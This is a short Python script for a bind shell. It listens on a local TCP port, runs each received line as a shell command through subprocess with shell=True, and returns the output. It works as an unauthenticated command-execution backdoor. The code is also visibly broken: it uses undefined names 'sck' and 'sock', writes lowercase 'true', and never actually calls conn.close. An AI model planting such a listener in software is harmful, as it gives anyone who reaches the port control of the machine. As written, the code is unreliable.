#!/usr/bin/python
import socket
import subprocess

socket=socket.socket(sck.AF_INET, sck.SOCK_STREAM)
sock.bind(('127.0.0.1', 10001))
sock.listen(1)
while True:
    conn, _ = sock.accept()
    while True:
        data = conn.recv(1024)
        if not data:
            break
        data = data.rstrip()
        output = subprocess.check_output(data, shell=true)
        conn.sendall(output)
        conn.close
        break
